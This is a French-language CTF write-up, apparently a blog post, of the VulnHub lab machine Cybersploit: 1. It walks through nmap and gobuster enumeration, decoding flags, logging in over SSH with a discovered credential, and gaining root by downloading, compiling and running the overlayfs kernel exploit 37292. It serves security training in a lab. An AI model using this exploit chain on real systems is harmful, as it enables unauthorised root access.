{"hash":"b89929ffb278454bd1f8bb0277abaa50df9b43f7","data":{"post":{"title":"CTF Cybersploit: 1","date":"31 May 2021","content":"<h2>Avant propos</h2>\n<p>Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.<br>\nCe CTF a été réalisé avec une machine attaquante <strong>Kali 2021.1</strong> (<code class=\"language-text\">lsb_release -r</code>).</p>\n<h2>Enumération</h2>\n<p>On récupère l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class=\"language-text\">sudo netdiscover</code>.<br>\nAvant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite <code class=\"language-text\">export IP=192.168.1.36</code>.<br>\nPuis on créé un dossier dédié à ce CTF <code class=\"language-text\">cd Documents/ctf &amp;&amp; mkdir Cybersploit1 &amp;&amp; cd Cybersploit1</code>.<br>\nOn lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ nmap -A -p- <span class=\"token variable\">$IP</span> -oN nmap.txt\nPORT   STATE SERVICE VERSION\n<span class=\"token number\">22</span>/tcp <span class=\"token function\">open</span>  <span class=\"token function\">ssh</span>     OpenSSH <span class=\"token number\">5</span>.9p1 Debian 5ubuntu1.10 <span class=\"token punctuation\">(</span>Ubuntu Linux<span class=\"token punctuation\">;</span> protocol <span class=\"token number\">2.0</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span> ssh-hostkey: \n<span class=\"token operator\">|</span>   <span class=\"token number\">1024</span> 01:1b:c8:fe:18:71:28:60:84:6a:9f:30:35:11:66:3d <span class=\"token punctuation\">(</span>DSA<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>   <span class=\"token number\">2048</span> d9:53:14:a3:7f:99:51:40:3f:49:ef:ef:7f:8b:35:de <span class=\"token punctuation\">(</span>RSA<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_  <span class=\"token number\">256</span> ef:43:5b:d0:c0:eb:ee:3e:76:61:5c:6d:ce:15:fe:7e <span class=\"token punctuation\">(</span>ECDSA<span class=\"token punctuation\">)</span>\n<span class=\"token number\">80</span>/tcp <span class=\"token function\">open</span>  http    Apache httpd <span class=\"token number\">2.2</span>.22 <span class=\"token variable\"><span class=\"token punctuation\">((</span>Ubuntu<span class=\"token punctuation\">))</span></span>\n<span class=\"token operator\">|</span>_http-server-header: Apache/2.2.22 <span class=\"token punctuation\">(</span>Ubuntu<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_http-title: Hello Pentester<span class=\"token operator\">!</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On a un un serveur <strong>SSH</strong> sur le port <strong>22</strong> et un serveur <strong>Apache</strong> 2.2.22 sur le port <strong>80</strong>.</p>\n<p>Astuce vous pouvez ajouter le domaine <em>cybersploit-1.home</em> dans le fichier <code class=\"language-text\">/etc/hosts</code> avec <strong>Vim</strong> (ou un autre éditeur de texte).</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">sudo</span> <span class=\"token function\">vim</span> /etc/hosts\n<span class=\"token number\">192.168</span>.1.36    cybersploit-1.home</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Avec <strong>Gobuster</strong>, on scan dossiers et pages présents sur le serveur <strong>Apache</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ gobuster <span class=\"token function\">dir</span> -u http://<span class=\"token variable\">$IP</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.xml,.js,.md,.log,.zip \n/index                <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">2333</span><span class=\"token punctuation\">]</span>\n/index.html           <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">2333</span><span class=\"token punctuation\">]</span>\n/robots               <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">79</span><span class=\"token punctuation\">]</span>  \n/robots.txt           <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">79</span><span class=\"token punctuation\">]</span>  \n/hacker               <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">3757743</span><span class=\"token punctuation\">]</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Dans le fichier <a href=\"http://cybersploit-1.home/robots.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">robots.txt</a>, on une chaine de caractère de type <strong>base64</strong> <code class=\"language-text\">R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9</code>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">'R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9'</span> <span class=\"token operator\">|</span> base64 -d\nGood Work <span class=\"token operator\">!</span>\nFlag1: cybersploit<span class=\"token punctuation\">{</span>youtube.com/c/cybersploit<span class=\"token punctuation\">}</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>On vient de découvrir le 1er flag. Dans le code source de la page d'accueil, on a un potentiel utilisateur \"itsskv\".</p>\n<div class=\"gridsome-highlight\" data-language=\"txt\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-txt line-numbers\"><code class=\"language-txt\">&lt;!-------------username:itsskv---------------------&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<h2>Pénétration</h2>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">ssh</span> itsskv@<span class=\"token variable\">$IP</span>\npassword: cybersploit<span class=\"token punctuation\">{</span>youtube.com/c/cybersploit<span class=\"token punctuation\">}</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> flag2.txt \n01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010 01101011 00100000 00100001 00001010 01100110 01101100 01100001 01100111 00110010 00111010 00100000 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 01111011 01101000 01110100 01110100 01110000 01110011 00111010 01110100 00101110 01101101 01100101 00101111 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 00110001 01111101</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>En convertissant de binaire vers texte (on trouve plein de convertisseurs sur Internet), on obtient le contenu du second flage ci-dessous.</p>\n<div class=\"gridsome-highlight\" data-language=\"txt\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-txt line-numbers\"><code class=\"language-txt\">good work !\nflag2: cybersploit{https:t.me/cybersploit1}</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Regardons la version du noyau <strong>Linux</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">uname</span> -a\nLinux cybersploit-CTF <span class=\"token number\">3.13</span>.0-32-generic</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Après une recherche d'exploit via <strong>searchsploit</strong>, on en trouve un qui pourrait nous correspondre.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ searchsploit linux kernel <span class=\"token number\">3.13</span>.0-32\nLinux Kernel <span class=\"token number\">3.13</span>.0 <span class=\"token operator\">&lt;</span> <span class=\"token number\">3.19</span> <span class=\"token punctuation\">(</span>Ubuntu <span class=\"token number\">12.04</span>/14.04/14.10/15.04<span class=\"token punctuation\">)</span> - <span class=\"token string\">'overlayfs'</span> Local Privilege Escalation  <span class=\"token operator\">|</span> linux/local/37292.c</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>On vérifie quand même la distribution <strong>Linux</strong> du serveur.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> /etc/issue\nUbuntu <span class=\"token number\">12.04</span>.5 LTS <span class=\"token punctuation\">\\</span>n <span class=\"token punctuation\">\\</span>l</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>On est sur du <strong>Ubuntu</strong> 12.04.5 avec un kernel <strong>Linux</strong> 3.13.0, c'est exploitable. Avant de s'emballer, on vérifie si on peut utiliser le compilateur <strong>GCC</strong> (<strong>G</strong>NU <strong>C</strong>ompiler <strong>C</strong>ollection).</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">which</span> gcc\n/usr/bin/gcc</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>C'est tout bon. On va donc transférer l'exploit sur le serveur via un serveur HTTP sur <strong>Python</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ searchsploit -p <span class=\"token number\">37292</span>\nPath: /usr/share/exploitdb/exploits/linux/local/37292.c\n$ <span class=\"token function\">cp</span> /usr/share/exploitdb/exploits/linux/local/37292.c exploit.c\n$ python3 -m http.server <span class=\"token number\">8000</span>\nServing HTTP on <span class=\"token number\">0.0</span>.0.0 port <span class=\"token number\">8000</span> <span class=\"token punctuation\">(</span>http://0.0.0.0:8000/<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">..</span>.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>De retour sur le serveur, on se place dans le dossier \"/tmp\" et on récupère le fichier de l'exploit afin de le compiler et de l'exécuter.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token builtin class-name\">cd</span> /tmp\n$ <span class=\"token function\">wget</span> http://192.168.1.38:8000/exploit.c\n$ gcc exploit.c -o exploit\n$ ./exploit\nspawning threads\n<span class=\"token function\">mount</span> <span class=\"token comment\">#1</span>\n<span class=\"token function\">mount</span> <span class=\"token comment\">#2</span>\nchild threads <span class=\"token keyword\">done</span>\n/etc/ld.so.preload created\ncreating shared library\n$ <span class=\"token function\">id</span>\n<span class=\"token assign-left variable\">uid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">gid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">groups</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span>,1001<span class=\"token punctuation\">(</span>itsskv<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Chouette, l'exploit a bien fonctionné car on est root de la machine. On trouve facilement le troisième et dernier flag.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> /root/finalflag.txt\nflag3: cybersploit<span class=\"token punctuation\">{</span>Z3X21CW42C4 many many congratulations <span class=\"token operator\">!</span><span class=\"token punctuation\">}</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n","download":"https://www.vulnhub.com/entry/cybersploit-1,506","tags":[{"title":"Pentest","path":"/tag/Pentest/"},{"title":"CTF","path":"/tag/CTF/"}],"timeToRead":4,"parts":[{"title":"CTF Cybersploit: 1","href":""},{"title":"CTF Cybersploit: 2","href":"ctf-cybersploit-2"}]}},"context":{}}